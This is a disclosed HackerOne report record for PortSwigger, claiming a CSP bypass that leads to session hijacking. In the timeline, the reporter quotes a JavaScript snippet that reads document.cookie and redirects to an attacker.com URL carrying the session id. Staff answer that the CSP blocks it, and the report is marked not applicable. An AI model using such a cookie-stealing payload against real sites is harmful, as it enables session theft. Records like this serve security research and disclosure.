---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/business-logic-errors
  - env/web
substate: "not-applicable"
weakness: "Business Logic Errors"
enriched: true
date: 2024-02-23
submitted: 2024-02-23T05:22:01.104Z
bounty_usd: null
votes: 48
cve: []
program: "[[programs/portswigger|PortSwigger Web Security]]"
reporter: "priyanshusharma9789"
source: "https://hackerone.com/reports/2387458"
title: "CSP Bypass and escalation of https://hackerone.com/reports/2279346"
---
# CSP Bypass and escalation of https://hackerone.com/reports/2279346

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 48 | **Program:** PortSwigger Web Security | **Disclosed:** 2024-02-23

- Report: [https://hackerone.com/reports/2387458](https://hackerone.com/reports/2387458)
- CWE: Business Logic Errors
- Submitted: 2024-02-23T05:22:01.104Z

## Timeline

- **Report Filed**
- **Report Not Applicable**
- **2024-02-23** @priyanshusharma9789: Okay , If img is not impactful then with using of CSP exfilteration tag I'm able to do open redirection and session hijacking by only injecting of :

var sessionid = document.cookie.split('=')[1]+"."; 
document.location = "https://attacker.com/?" + sessionid; 

this is the worst scenario where i get session id's and open rediection easily .

Reference : https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
- **2024-02-23** @garethheyes: Go to devtools, go to the elements tab, edit HTML and add an image tag to an arbitrary location and observe that our CSP will block the request.
- **Comments Closed**
- **Report Reopened**
- **Report Not Applicable**
- **Agreed On Going Public**
- **2024-02-23** @albinowax: Hi, we've initiated disclosure as requested via email.
- **Agreed On Going Public**
- **Report Became Public**
- **2024-02-23** @priyanshusharma9789: I want to give me remarks for great work
